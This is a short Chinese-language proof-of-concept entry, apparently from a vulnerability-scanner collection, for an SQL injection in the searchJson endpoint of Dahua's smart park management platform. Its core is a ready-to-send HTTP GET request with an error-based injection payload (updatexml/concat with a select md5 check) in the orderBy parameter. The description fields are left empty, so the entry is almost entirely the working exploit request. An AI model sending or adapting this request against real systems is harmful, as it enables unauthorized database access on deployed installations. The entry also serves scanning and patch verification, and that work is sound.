﻿# 大华智慧园区综合管理平台 searchJson SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Accept-Encoding: gzip, deflate
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：大华智慧园区综合管理平台 searchJson SQL注入漏洞.poc
